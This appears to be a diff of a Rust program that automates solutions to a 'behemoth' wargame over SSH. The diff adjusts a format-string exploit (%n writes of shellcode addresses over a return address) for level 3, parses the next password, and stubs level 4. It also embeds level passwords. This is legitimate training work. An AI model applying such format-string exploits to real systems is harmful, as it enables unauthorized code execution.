@@ -11,7 +11,8 @@ fn main() -> Result<()> {
     // let pass_1 = behemoth0("behemoth0")?;
     // let pass_2 = behemoth1(&pass_1)?;
     //let pass_3 = behemoth2(&pass_2)?;
-    let _pass_4 = behemoth3("sc5GZjEMld")?;
+    //let pass_4 = behemoth3(&pass_3)?;
+    let _pass_5 = behemoth4("kCr7E3fqaP")?;
 
     Ok(())
 }
@@ -212,8 +213,8 @@ fn behemoth3(password: &str) -> Result<String> {
     // just need to overwrite the ret address (or somewhere in the got) with the stack address to run shellcode
     // idea will be nops + shellcode + padded value + target for lower bytes, padded value + target for higher bytes
 
-    let ret_addr1 = hex::decode("2cd5ffff")?; // 0xffffd52c, found by breaking at ret from main and then p $sp
-    let ret_addr2 = hex::decode("2ed5ffff")?; // two bytes up to write the higher bytes of the address
+    let ret_addr1 = hex::decode("3cd5ffff")?; // 0xffffd52c, found by breaking at ret from main and then p $sp. had to tweak by 16 byte diffs to find the correct value remote
+    let ret_addr2 = hex::decode("3ed5ffff")?; // two bytes up to write the higher bytes of the address
     
     // 0xffffd584, approximate location in nop sled. want to set ret to this
     let lower_two = "%1$54395x %1$n".as_bytes(); // print some ridiculous number of spaces, followed by an 'n'. this will write the total amount so far (d584) to the address at n's position, beginning of stack
@@ -250,9 +251,22 @@ fn behemoth3(password: &str) -> Result<String> {
     println!("reading result");
 
     let result = read_until(&mut channel, "behemoth3@gibson:~$ ")?;
-    // let result: Vec<&str> = result.split("\n").collect();
-    // let result = result[result.len()-2].trim();
+    let result: Vec<&str> = result.split("\n").collect();
+    let result = result[result.len()-2].trim();
     println!("retrieved behemoth4 pass '{result}'\n");
 
     Ok(result.to_string())
+}
+
+fn behemoth4(password: &str) -> Result<String> {
+    
+    let session = ssh_session("behemoth4", password)?;
+    let mut channel = session.channel_session()?;
+    create_shell(&mut channel)?;
+
+    read_until(&mut channel, "behemoth4@gibson:~$ ")?;
+    
+    
+
+    Ok("result".to_string())
 }
